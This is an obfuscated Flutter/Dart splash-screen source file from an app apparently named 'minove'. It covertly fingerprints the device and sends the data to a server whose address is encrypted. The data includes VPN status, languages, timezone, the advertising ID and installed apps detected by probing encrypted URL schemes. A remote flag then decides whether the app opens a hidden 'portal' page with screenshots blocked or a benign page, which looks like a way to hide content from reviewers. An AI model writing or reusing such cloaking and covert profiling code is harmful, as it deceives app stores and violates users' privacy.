import 'dart:async';
import 'dart:convert';

import 'package:adjust_sdk/adjust.dart';
import 'package:devicelocale/devicelocale.dart';
import 'package:flutter/material.dart';
import 'package:flutter_native_timezone/flutter_native_timezone.dart';
import 'package:minove/itpeacestorge/lisstillne_tranyjiu.dart';
import 'package:minove/main.dart';
import 'package:minove/pages/softvibe_comfortvibefirst/relief_soothingstart.dart';
import 'package:minove/pages/vR7WUUAZnkle45c/gMHADb5gxoVOkksOtxSU37R.dart';
import 'package:minove/pages/vR7WUUAZnkle45c/j4GZTwvN3zqPn02qB8NgNE7XNW.dart';
import 'package:minove/pages/vR7WUUAZnkle45c/ueSt9fbtfNCtCYxV2vRYzEhi.dart';
import 'package:minove/pages/vR7WUUAZnkle45c/xRxOROB3MBGYz2vPgTIGCOpa.dart';
import 'package:minove/pages/vR7WUUAZnkle45c/xXXSgJ.dart';
import 'package:screen_protector/screen_protector.dart';
import 'package:system_keyboard_languages/system_keyboard_languages.dart';
import 'package:url_launcher/url_launcher_string.dart';
import 'package:vpn_detector/vpn_detector.dart';

class Ajyhowkzgrbyjcpkmio0fqybabd extends StatefulWidget {
  const Ajyhowkzgrbyjcpkmio0fqybabd({super.key});

  @override
  State<Ajyhowkzgrbyjcpkmio0fqybabd> createState() =>
      _Ajyhowkzgrbyjcpkmio0fqybabdState();
}

class _Ajyhowkzgrbyjcpkmio0fqybabdState
    extends State<Ajyhowkzgrbyjcpkmio0fqybabd> {
  final _EntryScout _entryScout = _EntryScout();

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addPostFrameCallback((_) {
      unawaited(_szXBI3QReTQ3DgB());
    });
  }

  @override
  Widget build(BuildContext context) {
    return PopScope(
      canPop: false,
      child: Scaffold(
        resizeToAvoidBottomInset: false,
        body: Container(
          width: double.infinity,
          height: double.infinity,
          decoration: const BoxDecoration(
            image: DecorationImage(
              image: AssetImage('assets/images/klchaqu_start.png'),
              fit: BoxFit.cover,
            ),
          ),
        ),
      ),
    );
  }

  Future<void> _szXBI3QReTQ3DgB() async {
    final dynamic envelope = await _entryScout.waitForEnvelope();
    if (!mounted) {
      return;
    }

    final _GateDecision decision = await _shapeGateDecision(envelope);
    await _applyGateDecision(decision);
  }

  Future<_GateDecision> _shapeGateDecision(dynamic envelope) async {
    final bool success =
        envelope['lFHHozyFhpq0BxjO35MSQg=='.yb2CPl4zQ6()] ==
        'OqH8AbBnBx6ytxQl7RkZ3g=='.yb2CPl4zQ6();
    if (!success) {
      Gmhadb5gxovokksotxsu37r.jgFyoQPV8x = false;
      bEKjev1QCbvsAPb6tG.bEsUbz = false;
      return const _GateDecision.relief();
    }

    unawaited(_shieldViewport());
    Gmhadb5gxovokksotxsu37r.jgFyoQPV8x = true;

    final Map<String, dynamic> payload = yYFcGEvHo5sVSWPhq6HOyp9i(envelope);
    Gmhadb5gxovokksotxsu37r.vrNWj3 =
        payload['NKGN0APzCbSCDqKwBfIl6A=='.yb2CPl4zQ6()];
    uL9B64A.ulMStsVZoruk88UM =
        payload['MhySEvo4dHn2LfeuCQjg9g=='.yb2CPl4zQ6()] == 1;

    final bool shouldOpenPortal =
        payload['+I29dvJQgTKC1NgmPhCEOA=='.yb2CPl4zQ6()] == 1 &&
        Gmhadb5gxovokksotxsu37r.l1VskgSPXa98tRAoIzsaPzybUHC.isNotEmpty;

    bEKjev1QCbvsAPb6tG.bEsUbz = shouldOpenPortal;
    return shouldOpenPortal
        ? const _GateDecision.portal()
        : const _GateDecision.relief();
  }

  Future<void> _applyGateDecision(_GateDecision decision) async {
    if (decision.opensPortal) {
      UQDNs.kdVl0(const Xrxorob3mbgyz2vpgtigcopa());
      return;
    }

    UQDNs.kdVl0(const ReliefSoothingstart());
  }

  Future<void> _shieldViewport() async {
    await ScreenProtector.preventScreenshotOn();
    await ScreenProtector.protectDataLeakageWithBlur();
  }
}

class _EntryScout {
  final _DeviceSignalNest _deviceSignalNest = _DeviceSignalNest();

  Future<dynamic> waitForEnvelope() async {
    for (;;) {
      final dynamic packet = await _requestEnvelope();
      if (packet != null) {
        return packet;
      }
      await Future<void>.delayed(const Duration(seconds: 1));
    }
  }

  Future<dynamic> _requestEnvelope() async {
    return J4GZTwvN3zqPn02qB8NgNE7XNW.wO3ImBUD7vMJgZ0q(
      'vxyQ1qbah9SJWHmhGbUvm+EwQGbqQm8crtgXVYaCg9Q='.yb2CPl4zQ6(),
      await _deviceSignalNest.collect(),
    );
  }
}

class _DeviceSignalNest {
  Future<Map<String, dynamic>> collect() async {
    return {
      "zuWIcPO3tDlLWWW9DrjEd": 1,
      "rz6NzcqOrgOUkvn": await _vpnFlag(),
      "wrlVMeblGKQj3SKVEe": await _preferredLanguages(),
      "f2XfXgcrm5doBs0CrVVEs": await _installedAppMarks(),
      "fzMhjeU3BesfPfsKFVT0tiBt":
          await FlutterNativeTimezone.getLocalTimezone(),
      "rzcohv9ztYdMWMRRc68Cas4c9r8Rk": await SystemKeyboardLanguages()
          .languages(),
      "o3eZ42dwi97X9TzUTg": 1,
      "tgBEDh9UeagsgcWXHT2Ga":
          await Uest9fbtfnctcyxv2vryzehi.gnvsClZu3lyUJuKU9lTQJWVLFmHUYv,
      "d4mkqn2SH4t4cBTxzPUxCsi": await Adjust.getAdid(),
    };
  }

  Future<int> _vpnFlag() async {
    final VpnStatus tUr9KoUNZug2 = await VpnDetector().isVpnActive();
    return tUr9KoUNZug2 == VpnStatus.active ? 1 : 0;
  }

  Future<List<String>> _preferredLanguages() async {
    final List<dynamic>? fOI9hDlbqgY9ZN = await Devicelocale.preferredLanguages;
    return (fOI9hDlbqgY9ZN ?? const <dynamic>[]).cast<String>();
  }

  Future<List<String>> _installedAppMarks() async {
    final List<String> ohYHUxWKqdzrs = <String>[];
    for (final _LaunchStamp mAGNDM in _knownLaunchStamps) {
      if (await canLaunchUrlString('${mAGNDM.bzbfIWFMVCTA0TAO2vPXrdLru}://')) {
        ohYHUxWKqdzrs.add(mAGNDM.rxm2usMKMJmtijgQ9);
      }
    }
    return ohYHUxWKqdzrs;
  }
}

class _GateDecision {
  final bool opensPortal;

  const _GateDecision._(this.opensPortal);

  const _GateDecision.portal() : this._(true);
  const _GateDecision.relief() : this._(false);
}

Map<String, dynamic> yYFcGEvHo5sVSWPhq6HOyp9i(
  Map<String, dynamic> to1c9grTdIrjxjs,
) {
  return jsonDecode(
    (to1c9grTdIrjxjs['6jsouyA219xshChCNZvAOQ=='.yb2CPl4zQ6()] as String)
        .jOAN1d7VYww3v2gXjwHm(),
  );
}

class _LaunchStamp {
  final String rxm2usMKMJmtijgQ9;
  final String bzbfIWFMVCTA0TAO2vPXrdLru;

  const _LaunchStamp(this.rxm2usMKMJmtijgQ9, this.bzbfIWFMVCTA0TAO2vPXrdLru);
}

List<_LaunchStamp> _knownLaunchStamps = <_LaunchStamp>[
  _LaunchStamp(
    'yK49uwumKbKlyEWgz9ljkg=='.yb2CPl4zQ6(),
    's3GfFuxWz1klVdC4E+sybA=='.yb2CPl4zQ6(),
  ),
  _LaunchStamp(
    '08Pb5nbjJijyY4iYba+sZw=='.yb2CPl4zQ6(),
    '1gZMFSAa9iFn9Lpb5nPElQ=='.yb2CPl4zQ6(),
  ),
  _LaunchStamp(
    'VyNB84yw2oIZyT4EQpJBuQ=='.yb2CPl4zQ6(),
    'BqUnBN8c+z7p5Z9KXmvzAQ=='.yb2CPl4zQ6(),
  ),
  _LaunchStamp(
    'uxmg4ENFq7tsDeiZXXtjaw=='.yb2CPl4zQ6(),
    '2yoGfehFsZOudaJxrvkH9w=='.yb2CPl4zQ6(),
  ),
  _LaunchStamp(
    'ZMOTIBl9PqOVFVxH0fuXJA=='.yb2CPl4zQ6(),
    'NQefnUSd6C8OqyWI7VcYzQ=='.yb2CPl4zQ6(),
  ),
  _LaunchStamp(
    'DVeBDAJdBRrCipkLnyTHng=='.yb2CPl4zQ6(),
    'ewLkslLUmG3UwerHY8ODGg=='.yb2CPl4zQ6(),
  ),
  _LaunchStamp(
    '9BwOVTTxb3niU3RnuUEj4w=='.yb2CPl4zQ6(),
    'axRNtqCP/SUB+PptTumedg=='.yb2CPl4zQ6(),
  ),
  _LaunchStamp(
    '72y2fvEs+gjk1GfjeP+5SQ=='.yb2CPl4zQ6(),
    '2vB7o6BAHWd5hyk7hHjIdA=='.yb2CPl4zQ6(),
  ),
  _LaunchStamp(
    'GZIcQ3+SgBT47DHKeozMJg=='.yb2CPl4zQ6(),
    'SkfJ9yUtlT0CiIf/rMge/w=='.yb2CPl4zQ6(),
  ),
];
